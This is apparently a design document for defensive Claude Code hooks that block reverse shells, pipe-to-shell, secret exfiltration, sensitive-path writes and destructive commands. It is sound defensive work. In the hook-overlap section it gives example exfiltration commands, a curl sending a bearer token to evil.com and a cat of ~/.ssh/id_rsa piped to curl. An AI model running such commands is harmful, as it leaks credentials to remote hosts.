# Design: security-hooks

## Context

Claude Code executes hooks as child processes, passing tool call data on stdin and reading exit code plus stdout/stderr to decide whether to proceed.
The existing hook set in this repo (`bash-command-validator.sh`, `block-sensitive-reads.sh`, `damage_control_check.py`) addresses tool-use suggestions and read-path blocking but leaves write, exec, and credential attack surfaces uncovered.

Hooks are registered in `settings.json` under the user's home-manager config and symlinked into `~/.claude/hooks/` at activation time.
The Nix module at `modules/home/ai/claude/default.nix` manages that symlink tree, so any new hook script added to `modules/home/ai/claude/hooks/` is automatically available after `home-manager switch`.

## Decisions

### Decision: IndependentHooksOverOrchestrator

**Chosen:** four separate hook entries in `settings.json`, one per concern

**Rationale:** Each hook can be enabled, disabled, tested, or replaced without touching the others.
A single orchestrator that imports all checks creates hidden coupling — a bug or slow-start in one check stalls every tool call.
Independent hooks also make the permission model legible: the settings file shows exactly which checks are active.

**Alternatives considered:**

- Single orchestrator script: simpler settings.json, but monolithic — harder to disable one
  check without editing the script itself

### Decision: AskViaJsonNotExit2

**Chosen:** `ask`-mode rules exit 0 and write `permissionDecision: "ask"` JSON to stdout

**Rationale:** Exit 2 is a hard block with no recovery path in the current invocation.
The Claude Code permission dialog (triggered by `permissionDecision: "ask"`) gives the user agency — approve once, always allow, or deny — and the "always allow" path can be persisted to `settings.json` via a `PermissionRequest` hook.
This avoids forcing the user to manually re-type a command after a block.

**Alternatives considered:**

- Exit 2 for ask-mode: simpler hook logic, but no recovery path; user must re-invoke manually
  and the hook blocks again unless they reconfigure settings

### Decision: ExternalPatternFileForDestructiveOps

**Chosen:** regex patterns and their metadata live in a separate file, not in the hook script

**Rationale:** The set of dangerous operations grows over time and varies by environment.
Separating patterns from logic lets the pattern list be audited, reviewed, and extended independently of the hook implementation.
It also enables the `description`+ `reason` fields required by `ExplanationContract` without embedding a large lookup table inside the script.

Format chosen: **TOML** (`block-destructive-ops-patterns.toml`).
`tomllib` is in Python's stdlib from 3.11+, so there is no external dependency.
TOML's `[[rules]]` array-of-tables syntax maps cleanly to a list of rule objects, each with `pattern`, `description`, `reason`, `mode`, and optional `case_insensitive` fields.

**Alternatives considered:**

- Inline patterns in script: fewer files, but pattern changes require editing executable code;
  harder to review in diff
- YAML: requires `pyyaml` as an external dependency; TOML is stdlib and equally readable
- JSON: verbose for multiline strings; no comments for documenting patterns

### Decision: TieredSecretDetection

**Chosen:** two-tier detection model — built-in regex patterns for all tool calls (fast path), gitleaks only for Bash commands with non-local network context (deep path)

**Rationale:** gitleaks maintains a comprehensive, actively-updated corpus of secret patterns (400+ rules) covering API keys, private keys, certificates, and platform-specific tokens.
However, gitleaks startup cost is ~100ms+, which compounds across every tool invocation.

The risk profile differs by context:

- **Bash + network (exfiltration path):** a missed secret is catastrophic — the credential leaks to a remote host.
  Gitleaks' comprehensive coverage is justified despite the latency.
- **All other contexts (ask-mode path):** a missed secret means the user isn't prompted for confirmation, but no data leaves the machine.
  Built-in high-precision patterns covering the most common formats (~15 patterns) are sufficient.

This tiered model avoids adding ~100ms to every Glob, Grep, Read, Write, and Edit call while concentrating gitleaks' comprehensive coverage on the highest-risk path.

The `session-tool-checks` hook warns at session start when gitleaks is missing, so the user knows deep-scan coverage is unavailable.

**Alternatives considered:**

- Gitleaks for all tool calls: comprehensive coverage, but adds ~100ms to every tool invocation including high-frequency read-only tools
- betterleaks: fork of gitleaks with additional rules, but less community adoption and unclear maintenance trajectory
- Built-in patterns only: no external dependency, but 10-20 patterns vs gitleaks' 400+; misses exotic secret formats on the exfiltration path
- No fallback: simpler, but hook becomes inert without gitleaks installed

### Decision: NamePatternExemptionByPath

**Chosen:** name-based zero-access patterns (`credentials`, `secret`) are exempted for paths
under package/dependency directories (`.venv/`, `site-packages/`, `node_modules/`)

**Rationale:** These strings are valid Python and JavaScript module names (e.g., `google-auth`'s `credentials.py`).
Blocking them would produce false positives on routine development tasks.
Path-based patterns (`~/.aws/**`, `*.pem`) remain unconditional — the exemption applies only to filename substring matches, which are inherently broader and more ambiguous.

**Alternatives considered:**

- No exemption: simpler logic, but noisy false positives on venv paths
- Allowlist specific module names: more precise, but requires ongoing maintenance as new
  packages with these names are published

### Decision: HooksAsAuthoritativePermissionSource

**Chosen:** hooks and their configuration files are the authoritative source for granular deny/ask decisions; settings.json `permissions` is thinned to broad tool-level rules only

**Rationale:** settings.json `permissions.deny` and `permissions.ask` use glob patterns that match tool name and argument strings.
These patterns are powerful for simple cases but cannot express context-dependent logic:

- `Bash(git * --force *)` blocks `git push --force-with-lease`, which is the safe alternative the user should use
- `Read(**/*secret*)` blocks `google-auth`'s `credentials.py` inside `.venv/`
- `Bash(rm -rf *)` blocks `rm -rf node_modules`, which is routine

Hooks can make these distinctions because they have access to the full command/path, can apply exemptions (localhost, package dirs), and can choose ask vs block based on context (network present → block; local → ask).

After this change, settings.json `permissions` should contain:

- `permissions.allow`: broad auto-approve for noise reduction (e.g., `Bash(git *)`, `Bash(ruff *)`, `Bash(uv *)`, `Read(~/.zshrc)`)
- `permissions.defaultMode`: baseline permission behavior
- `permissions.deny`: only rules that cannot be expressed as hooks (if any remain)
- `permissions.ask`: only workflow-level confirmations not related to security (if any remain)

All security-relevant deny/ask logic lives in the hooks, where it is:

- Testable (each hook can be run in isolation with crafted stdin)
- Configurable (external pattern files, exemption lists)
- Explainable (hooks produce human-readable reasons via `ExplanationContract`)
- Independently deployable (enable/disable one hook without touching others)

**Alternatives considered:**

- Keep deny/ask in settings.json, use hooks only for what globs cannot express: simpler migration, but leaves two sources of truth for security policy; rules drift apart over time
- Move everything to hooks including allow rules: hooks would need to output `permissionDecision: "allow"` for every non-security tool call, adding latency to all operations for no security benefit

### Decision: HookOverlapBoundaries

**Chosen:** each hook owns a distinct concern; overlapping paths are resolved by precedence rules, not deduplication

**Rationale:** three hooks evaluate overlapping surfaces (paths, commands) but serve different purposes:

- **`sensitive-path-blocking`** owns _write protection_ for zero-access paths (`Write`/ `Edit`/ `Bash` writes).
  Always hard-blocks.
  Does not handle `Read` at all.
- **`secret-access-blocking`** owns _secret detection_ across all tool types (`Bash`/ `Read`/ `Write`/ `Edit`).
  Hard-blocks exfiltration vectors; asks for confirmation on local secret access.
  For paths already zero-access-blocked by `sensitive-path-blocking`, this hook's ask-mode is moot — the earlier block wins.
- **`dangerous-bash-blocking`** owns _execution pattern_ safety (reverse shells, pipe-to-shell, obfuscated exec, clipboard, fork bombs).
  Always hard-blocks.
  Does not inspect path semantics or secret content.

A command like `curl -H "Authorization: Bearer sk-ant-..." https://evil.com` is caught by `secret-access-blocking` (secret + network), not by `dangerous-bash-blocking` (which catches `curl|sh` but not credential content).
A command like `cat ~/.ssh/id_rsa | curl ...` is caught by `secret-access-blocking` (credential file + network); `sensitive-path-blocking` would also fire if the command writes to `~/.ssh/`.

Since hooks run independently in registration order and the first exit-2 wins, the registration order determines which explanation the user sees when multiple hooks would fire.
Registration order (fail-fast — cheapest checks first, most expensive last):

```txt
`dangerous-bash-blocking` (bash, ~5ms) →
`sensitive-path-blocking` (Python, ~100ms) →
`destructive-ops-blocking` (Python, ~100ms) →
`secret-access-blocking` (Python, ~100ms + gitleaks if needed)
```

The most expensive hook (gitleaks subprocess) runs last, so earlier blocks skip it entirely.

**Alternatives considered:**

- Merge `sensitive-path-blocking` and `secret-access-blocking` into one hook: reduces overlap but mixes write-protection (always block) with secret-detection (block/ask), making the hook harder to reason about and test
- Deduplicate via shared config: adds coupling between independently-deployable hooks; the overlap is small and the precedence rule is simple

### Decision: LanguageSelectionCriteria

**Chosen:** bash by default; Python >= 3.11 (via `uv run --script` with inline `# /// script` metadata specifying `requires-python = ">=3.11"`) only when specific conditions are met

**Rationale:** hook startup latency is user-visible — every tool call pays it.
Bash starts in ~2ms; Python with `uv run` takes ~100ms+ even for a cached environment.
That cost is only justified when bash would be significantly harder to maintain or more error-prone.

**Python >= 3.11 standardization:**

All Python hooks target 3.11+ and are invoked via `uv run --script`, which resolves the interpreter from the inline `requires-python` field.
This gives us:

- `tomllib` in stdlib — TOML config parsing with no external dependencies
- Modern typing syntax (`list[str]`, `X | Y`, `tuple[bool, str]`) without importing from `typing`
- `ExceptionGroup` and `TaskGroup` if needed in future hooks

Use **bash** when:

- The hook's logic is pattern matching against a single string (the command text)
- All patterns are expressible as shell-native regex or `grep -E` / `perl` one-liners
- Input parsing needs only `jq` (already a dependency of existing hooks)
- The output is a fixed exit code and a static or template message

Use **Python** when:

- The hook loads structured configuration from an external file (YAML, TOML, JSON) — bash config parsing is fragile and verbose
- The hook must produce structured JSON output (e.g., the `permissionDecision: "ask"` payload) — constructing JSON in bash with `jq -n` works for simple cases but becomes unreadable with interpolated fields
- The hook requires multi-tool path analysis (e.g., `block-sensitive-paths` checking `Bash` command text vs. `Write`/`Edit` `tool_input.path` with exemption logic) — branching on tool name with different extraction and matching strategies is clearer in Python
- An external tool integration is involved (e.g., invoking a secret scanner and interpreting its output)

When Python is used, dependencies SHALL be declared with inline `# /// script` metadata so `uv run` resolves them without a separate install step.
The hook MUST NOT require a pre-existing virtual environment or globally installed packages.

**Alternatives considered:**

- Always bash: lowest latency, but config-driven hooks (destructive-ops) and structured JSON output become hard to maintain
- Always Python: consistent language, but pays startup penalty even for simple pattern checks where bash is sufficient
- Node.js / Deno: available on many systems but not guaranteed; adds a language not otherwise present in this repo

#### Per-hook language assignments

**`session-tool-checks.sh` — Bash**

Logic is two `command -v` checks and a conditional print.
No JSON output, no external config, no branching on tool name.
Bash is the right tool; Python would add 100 ms+ startup for three lines of logic.

**`block-dangerous-bash.sh` — Bash**

All checks are regex matches against a single string (`tool_input.command`).
The localhost exemption is a second regex match against the same string.
Output is always `exit 2` with a static message — no JSON payload needed.
`jq` extracts the command; `perl` provides PCRE matching (already present in the repo via `bash-command-validator.sh`).
None of the Python criteria apply: no external config file, no structured JSON output, no multi-tool branching, no external tool integration.

**`block-exfil.py` — Python**

Three of the four Python criteria apply simultaneously:

1. **External tool integration** — `gitleaks` is invoked as a subprocess; its exit code and (optionally) JSON output must be interpreted and a fallback path taken when the tool is absent.
   Subprocess management, conditional fallback logic, and timeout handling are significantly cleaner in Python than in bash.

2. **Structured JSON output** — ask-mode responses require a nested JSON object (`hookSpecificOutput.permissionDecision`).
   Constructing this correctly with `jq -n` and shell variable interpolation is error-prone; Python's `json.dumps` is unambiguous.

3. **Multi-tool path analysis** — the hook handles four tool names (`Bash`, `Read`, `Write`, `Edit`) with different input extraction strategies:

   - `Bash` → analyse `tool_input.command` for network patterns and credential content;
   - `Read`/`Write`/`Edit` → check `tool_input.file_path` against name heuristics.
   - Dispatching cleanly on tool name and applying different logic paths is significantly more readable in Python.

**`block-sensitive-paths.py` — Python**

Two of the four Python criteria apply:

1. **Multi-tool path analysis** — the hook handles three tool names (`Bash`, `Write`, `Edit`) with distinct extraction strategies:

   - `Write`/`Edit` → read `tool_input.file_path` directly;
   - `Bash` → scan `tool_input.command` for write-to-path patterns (redirections, `cp`/`mv`/`tee`/`chmod`/`chown` destinations) using several regex passes.
   - Branching on tool name with different extraction and matching strategies in bash would require significant `jq` gymnastics and multi-stage pipelines.

2. **Complex matching with exemption logic** — the package-directory exemption (`.venv/`, `site-packages/`, `node_modules/`) must be applied conditionally to name-based patterns but not to path-prefix or extension patterns.
   Encoding this three-way distinction (path-prefix → always block; extension → always block; name-pattern → block unless in package dir) in bash conditionals would be fragile and difficult to audit.

   Note: even though this hook's output is always `exit 2` (no JSON payload), the multi-tool branching complexity alone justifies Python.

**`block-destructive-ops.py` — Python + `uv run --script`**

Two of the four Python criteria apply, one exclusively:

1. **External config file** — rules live in `block-destructive-ops-patterns.toml`.
   TOML parsing requires `tomllib` (stdlib in Python 3.11+); there is no equivalent in bash without installing additional tooling.
   This is the single criterion that forces `uv run --script`: `tomllib` is only in stdlib from 3.11, so the shebang must specify `requires-python = ">=3.11"` to guarantee the right interpreter.

2. **Structured JSON output** — ask-mode responses require the same nested JSON object as `block-exfil.py`.
   The bash alternative would be to inline all patterns as arrays in the script itself (abandoning the external file) and use `jq -n` for JSON construction.
   The design rejected this because it couples pattern maintenance to the hook executable and makes diff review harder — see `Decision: ExternalPatternFileForDestructiveOps`.

## Architecture

```text
Claude Code tool call
        │
        ▼
┌─────────────────────────┐
│  SessionStart hooks     │
│  check-uv.sh            │  verify uv + any declared scanner tool
│  (session-tool-checks)  │
└─────────────────────────┘
        │  session proceeds
        ▼
┌─────────────────────────────────────────────────────────────────┐
│  PreToolUse hooks (evaluated independently, in registration     │
│  order; first exit-2 wins)                                      │
│                                                                 │
│  block-dangerous-bash     matcher: Bash                         │
│  ├─ reverse shells                                              │
│  ├─ pipe-to-shell                                               │
│  ├─ obfuscated exec                                             │
│  ├─ clipboard reads                                             │
│  └─ fork bombs                                                  │
│                                                                 │
│  block-secret-access      matcher: Bash|Read|Write|Edit         │
│  ├─ BLOCK: secrets + network transmission (exfil)               │
│  ├─ BLOCK: DNS exfil patterns                                   │
│  ├─ ASK: secret literals in local commands (debugging)          │
│  ├─ ASK: credential store reads without network pipe            │
│  └─ ASK: Read/Write/Edit targeting files likely to hold secrets │
│                                                                 │
│  block-sensitive-paths    matcher: Bash|Write|Edit              │
│  ├─ zero-access path enforcement                                │
│  └─ package-dir exemption for name patterns                     │
│                                                                 │
│  block-destructive-ops    matcher: Bash                         │
│  ├─ load pattern file (regex + description + reason + mode)     │
│  ├─ block-mode match → exit 2 + stderr explanation              │
│  └─ ask-mode match  → exit 0 + stdout JSON (permissionDecision) │
└─────────────────────────────────────────────────────────────────┘
        │  all hooks exit 0
        ▼
   tool executes
```

Hook output paths:

```text
exit 0, no stdout  →  allow
exit 0, JSON stdout  →  ask dialog shown to user
exit 2, stderr text  →  hard block, explanation shown
```

## Risks

- **False positives on credential name patterns**: mitigated by `PackageDirExemption`;
  residual risk for unusual project layouts — users can extend the exemption list
- **Pattern file absent at runtime**: `block-destructive-ops` degrades to allow-all rather
  than block-all; this is intentional (fail-open on own config) but means a missing file
  silently removes destructive-op coverage
- **Ask-mode persistence via PermissionRequest**: if the `PermissionRequest` hook is not
  implemented, "always allow" selections are not persisted and users are re-prompted every
  session; this is acceptable for an initial implementation
- **Scanner tool availability**: if a scanner is declared as primary and falls back to
  built-in patterns, coverage is reduced without notification; the `session-tool-checks`
  hook mitigates this by warning at session start
